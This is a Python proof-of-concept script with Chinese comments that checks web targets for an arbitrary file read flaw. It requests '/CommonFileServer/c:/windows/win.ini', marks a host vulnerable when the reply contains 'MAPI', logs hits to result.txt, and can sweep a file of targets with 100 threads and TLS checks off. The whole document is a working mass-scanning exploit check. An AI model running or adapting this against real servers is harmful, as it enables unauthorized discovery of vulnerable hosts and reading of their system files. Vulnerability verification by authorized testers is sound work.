#导包
import argparse,sys,requests,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()   #解除警告

GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'
def banner():
    banner = '''         
 _   _               _             
| | | |             | |            
| |_| | __ _ _ __ __| | ___   __ _ 
|  _  |/ _` | '__/ _` |/ _ \ / _` |
| | | | (_| | | | (_| | (_) | (_| |
\_| |_/\__,_|_|  \__,_|\___/ \__, |
                              __/ |
                             |___/            
                  version:1.0.0
                  author:Hardog
'''
    print(banner)
def poc(target):
    url = target+"/CommonFileServer/c:/windows/win.ini"
    headers={
            "accept": "*/*",
            "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Accept-Encoding":"gzip, deflate",
            "Accept-Language":"zh-CN,zh;q=0.9",
            }
    res = ""
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code==200 and "MAPI" in res.text:
            print(f"[+] {GREEN}存在漏洞{target}\n{RESET}")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print(f"[-] 不存在漏洞")
    except:
        print(f"[*]无法访问")
def main():
    banner()
    #处理命令行参数
    parser = argparse.ArgumentParser(description='')
    #添加两个参数
    parser.add_argument('-u','--url',dest='url',type=str,help='urllink')
    parser.add_argument('-f','--file',dest='file',type=str,help='filename.txt(Absolute Path)')
    #调用
    args = parser.parse_args()
    # 处理命令行参数了
    # 如果输入的是 url 而不是 文件 调用poc 不开多线程
    # 反之开启多线程
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
if __name__ == '__main__':   #主函数入口
    main()     #入口  main()